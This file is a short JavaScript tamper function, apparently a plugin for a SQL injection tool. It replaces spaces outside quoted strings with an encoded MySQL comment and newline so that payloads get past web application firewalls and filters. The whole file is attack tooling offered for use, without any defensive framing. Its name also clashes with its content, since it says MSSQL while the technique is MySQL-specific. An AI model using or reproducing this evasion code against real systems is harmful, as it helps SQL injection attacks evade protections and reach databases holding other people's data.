//@name: 空格转#换行MSSQL
//@usage: payload
//@enable: false
//@description: 空格→%23%0A（引号感知，遇#/-- 截断，MySQL单行注释）
function tamper(payload){
    if (!payload) { return ''; }
    var retVal = '', quote = false, dquote = false;
    for (var i = 0; i < payload.length; i++){
        var c = payload.charAt(i);
        if (c === "'" && payload.charAt(i - 1) !== '\\'){ quote = !quote; }
        else if (c === '"' && payload.charAt(i - 1) !== '\\'){ dquote = !dquote; }
        if (!quote && !dquote){
            if (/\s/.test(c)){ retVal += '%23%0A'; }
            else if (c === '#' || payload.substr(i, 3) === '-- '){ retVal += payload.substring(i); break; }
            else { retVal += c; }
        } else { retVal += c; }
    }
    return retVal;
}